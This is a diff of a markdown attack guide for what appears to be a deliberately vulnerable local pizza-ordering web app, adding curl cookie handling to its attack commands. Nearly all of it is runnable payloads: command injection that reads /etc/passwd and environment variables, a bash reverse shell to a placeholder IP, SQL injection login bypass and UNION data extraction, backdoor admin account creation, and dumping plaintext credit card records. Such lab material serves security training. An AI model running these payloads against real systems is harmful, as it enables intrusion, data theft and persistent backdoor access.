@@ -10,6 +10,28 @@ These attacks are for **authorized security testing only** on your own infrastru
 
 ---
 
+## 📝 Using Cookies with curl
+
+Most endpoints require authentication. Use these curl flags to manage session cookies:
+
+```bash
+# Save cookies during login
+curl -c cookies.txt -X POST http://localhost:3000/auth/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=admin123"
+
+# Use saved cookies in subsequent requests
+curl -b cookies.txt http://localhost:3000/orders/menu
+```
+
+**Flags:**
+- `-c cookies.txt` = Save cookies to file
+- `-b cookies.txt` = Send cookies from file
+
+**Note:** In the examples below, replace `-H "Cookie: session=YOUR_SESSION_COOKIE"` with `-b cookies.txt` after logging in with `-c cookies.txt`.
+
+---
+
 ## Attack Vectors (Easiest to Hardest)
 
 ### 1. Command Injection via Admin Panel ⭐ EASIEST - **IMPLEMENTED**
@@ -23,30 +45,29 @@ These attacks are for **authorized security testing only** on your own infrastru
 
 #### Test Command Injection
 ```bash
-# First, get admin access (see section 8 below)
-# Then execute system commands directly
+# First, login as admin and save cookies
+curl -c cookies.txt -X POST "http://localhost:3000/auth/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=admin123"
 
-curl -X POST "http://localhost:3000/admin/system/execute" \
+# Execute system commands directly (use admin cookies)
+curl -b cookies.txt -X POST "http://localhost:3000/admin/system/execute" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
   -d '{"command": "whoami"}'
 
 # Read sensitive files
-curl -X POST "http://localhost:3000/admin/system/execute" \
+curl -b cookies.txt -X POST "http://localhost:3000/admin/system/execute" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
   -d '{"command": "cat /etc/passwd"}'
 
 # List container environment
-curl -X POST "http://localhost:3000/admin/system/execute" \
+curl -b cookies.txt -X POST "http://localhost:3000/admin/system/execute" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
   -d '{"command": "env"}'
 
 # Get reverse shell (start listener first: nc -lvnp 4444)
-curl -X POST "http://localhost:3000/admin/system/execute" \
+curl -b cookies.txt -X POST "http://localhost:3000/admin/system/execute" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION_COOKIE" \
   -d '{"command": "bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""}'
 ```
 
@@ -59,8 +80,8 @@ curl -X POST "http://localhost:3000/admin/system/execute" \
 
 #### Attack Point 1: Login Bypass
 ```bash
-# Bypass authentication with SQL injection
-curl -X POST "http://localhost:3000/auth/login" \
+# Bypass authentication with SQL injection (save cookies)
+curl -c cookies.txt -X POST "http://localhost:3000/auth/login" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=admin' OR '1'='1'--&password=anything"
 
@@ -69,27 +90,27 @@ curl -X POST "http://localhost:3000/auth/login" \
 
 #### Attack Point 2: Menu Category Filter (After Login)
 ```bash
-# Extract database information
-curl "http://localhost:3000/orders/menu?category=pizza' UNION SELECT id,name,price,description,category,available FROM products--" \
-  -H "Cookie: session=YOUR_SESSION_COOKIE"
+# Extract database information (use cookies from login)
+curl -b cookies.txt "http://localhost:3000/orders/menu?category=pizza' UNION SELECT id,name,price,description,category,available FROM products--"
 
 # Read files using LOAD_FILE (if MySQL FILE privilege exists)
-curl "http://localhost:3000/orders/menu?category=pizza' UNION SELECT 1,LOAD_FILE('/etc/passwd'),'3','4','5',1--" \
-  -H "Cookie: session=YOUR_SESSION_COOKIE"
+curl -b cookies.txt "http://localhost:3000/orders/menu?category=pizza' UNION SELECT 1,LOAD_FILE('/etc/passwd'),'3','4','5',1--"
 
 # Get MySQL version and user
-curl "http://localhost:3000/orders/menu?category=pizza' UNION SELECT 1,@@version,user(),database(),'5',1--" \
-  -H "Cookie: session=YOUR_SESSION_COOKIE"
+curl -b cookies.txt "http://localhost:3000/orders/menu?category=pizza' UNION SELECT 1,@@version,user(),database(),'5',1--"
 ```
 
 #### Attack Point 3: Create Admin User via Registration
 ```bash
 # Register with SQL injection to create admin account
-curl -X POST "http://localhost:3000/auth/register" \
+curl -c cookies.txt -X POST "http://localhost:3000/auth/register" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=backdoor&password=hacked123'), (999, 'backdoor', '21232f297a57a5a743894a0e4a801fc3', 'backdoor@evil.com', 1, NOW())--"
 
-# Now login with: username=backdoor, password=admin
+# Now login with: username=backdoor, password=admin (save cookies)
+curl -c cookies.txt -X POST "http://localhost:3000/auth/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=backdoor&password=admin"
 ```
 
 ---
@@ -102,28 +123,29 @@ curl -X POST "http://localhost:3000/auth/register" \
 
 #### Execute Arbitrary SQL (Requires Admin Access)
 ```bash
-# Read any table
-curl -X POST "http://localhost:3000/admin/database/query" \
+# First, login as admin and save cookies
+curl -c cookies.txt -X POST "http://localhost:3000/auth/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=admin123"
+
+# Read any table (use admin cookies)
+curl -b cookies.txt -X POST "http://localhost:3000/admin/database/query" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION" \
   -d '{"query": "SELECT * FROM users"}'
 
 # Get all payment information (including credit cards in plaintext!)
-curl -X POST "http://localhost:3000/admin/database/query" \
+curl -b cookies.txt -X POST "http://localhost:3000/admin/database/query" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION" \
   -d '{"query": "SELECT * FROM payment_transactions"}'
 
 # Create backdoor user
-curl -X POST "http://localhost:3000/admin/database/query" \
+curl -b cookies.txt -X POST "http://localhost:3000/admin/database/query" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION" \
   -d '{"query": "INSERT INTO users (username, password, is_admin) VALUES (\"backdoor2\", \"5f4dcc3b5aa765d61d8327deb882cf99\", 1)"}'
 
 # Read files using LOAD_FILE (if MySQL has FILE privilege)
-curl -X POST "http://localhost:3000/admin/database/query" \
+curl -b cookies.txt -X POST "http://localhost:3000/admin/database/query" \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_ADMIN_SESSION" \
   -d '{"query": "SELECT LOAD_FILE(\"/etc/passwd\")"}'
 ```
 
@@ -148,10 +170,13 @@ curl -X POST "http://localhost:3000/auth/api/login" \
 
 #### Attack Point 2: Credit Card Data in Plaintext
 ```bash
-# Login as any user
+# Login as any user (save cookies)
+curl -c cookies.txt -X POST "http://localhost:3000/auth/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=admin123"
+
 # View payment history (contains FULL credit card numbers and CVVs!)
-curl "http://localhost:3000/payment/history" \
-  -H "Cookie: session=YOUR_SESSION_COOKIE"
+curl -b cookies.txt "http://localhost:3000/payment/history"
 
 # Response includes:
 # - Full credit card numbers
